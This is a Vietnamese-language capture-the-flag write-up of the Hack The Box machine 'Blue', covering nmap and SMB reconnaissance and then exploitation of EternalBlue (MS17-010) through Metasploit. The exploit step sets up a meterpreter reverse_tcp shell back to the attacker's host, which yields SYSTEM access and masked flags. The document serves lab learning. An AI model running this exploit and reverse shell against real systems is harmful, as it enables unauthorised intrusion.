![image](https://hackmd.io/_uploads/ryGHx4tK0.png)

# Machine info and Comment
## Machine info
Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.

## Comment
- EternalBlue khai thác một lỗ hổng trong việc triển khai thực hiện giao thức SMB (Server Message Block) của Microsoft. Lỗ hổng này được biểu thị bằng mục CVE-2017-0144. Bằng cách gửi các gói dữ liệu được cấu hình đặc biệt đến một máy chủ SMB, kẻ tấn công có thể thực thi mã tùy ý trên hệ thống mục tiêu.
- Lỗ hổng này cho phép kẻ tấn công từ xa khai thác hệ thống mà không cần phải có quyền truy cập vật lý hay thông tin xác thực của người dùng.

# Recon
## Nmap
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -n 10.10.10.40
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 12:00 EDT
Nmap scan report for 10.10.10.40
Host is up (0.25s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
```
Nmap trả về cho ta **3** port đều liên quan đến giao thức và service liên quan đến Windows đúng với machine info

Điểm chú ý là Nmap trả về port 445 SMB

## Metasploit 
Metasploit có module `scanner/smb/smb_version` hỗ trợ ta thêm thông tin của SMB

`scanner/smb/smb_version` cho ta thông tin về hệ điều hành, hostname, phiên bản SMB

![image](https://hackmd.io/_uploads/BkywB4FtR.png)

```
msf6 > use 16
msf6 auxiliary(scanner/smb/smb_version) > options 

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set rhost 10.10.10.40
rhost => 10.10.10.40
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.40:445       - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:20h 5m 2s) (guid:{e751eff0-0e55-450f-b597-8eead0a0a7e9}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[+] 10.10.10.40:445       -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:20h 5m 2s) (guid:{e751eff0-0e55-450f-b597-8eead0a0a7e9}) (authentication domain:HARIS-PC)Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[*] 10.10.10.40:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Từ output thu được máy chủ SMB này dùng **Windows 7 Professional** với hostname là **HARIS-PC**

## SMBclient 
Ta sẽ kiểm tra xem máy chủ này có thư mục nào được chia sẻ không
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.40

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Có **5** SMB share. Kiểm tra xem nó có gì không
```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.40/Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011
```
Như có thể thấy nó không có gì cả

# Exploit
## Metasploit 
Với thông tin ta thu nhập được sau khi Recon và Machine info ta có thể khai thác cuộc tấn công [ExternalBlue](https://vi.wikipedia.org/wiki/EternalBlue):
- **MS17-010**
- Phần mềm độc hại là **WannaCry**

Tiến hành set local và target IP
```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.93
lhost => 10.10.14.93
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using
                                             -metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only
                                             affects Windows Server 2008 R2, Windows 7, Windows Embedded St
                                             andard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affe
                                             cts Windows Server 2008 R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
                                             t machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.93      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.
```
`run` để tiến hành khai thác
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
<SNIP>
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 2552 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# Post-Exploit
Như chúng ta thấy, hiện tại ta đã ở quyên **SYSTEM** nên có thể dễ dàng lấy được flag của user và root ở `Desktop

```
C:\Windows\system32>cd C:\Users       
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,690,125,824 bytes free
```

Lấy flag user
```
C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
31/07/2024  21:09                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,690,084,864 bytes free

C:\Users\haris\Desktop>type user.txt
type user.txt
cc178dbb1098**********
```
Lấy flag root
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
01/08/2024  18:11                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,427,805,696 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
2de9396590********
```
# Results
1. How many open TCP ports are listening on Blue? Don't include any 5-digit ports. --> 3
2. What is the hostname of Blue? --> haris-PC
3. What operating system is running on the target machine? Give a two-word answer with a name and high-level version. --> Windows 7
4. How many SMB shares are available on Blue? -> 5
5. What 2017 Microsoft Security Bulletin number describes a remote code execution vulnerability in SMB? --> MS17-010
6. Optional question: A worm was set loose on the internet in May 2017 propagating primarily through MS17-010. What is the famous name for that malware? --> WannaCry
7. What user do you get execution with when exploiting MS17-010? Include the full name, including anything before a --> nt authority\system
8. Submit the flag located on the haris user's desktop. --> cc178dbb1098be117b48*******
9. Submit the flag located on the administrator's desktop. --> 2de93965901348ba******

![image](https://hackmd.io/_uploads/HkRHQrtFA.png)

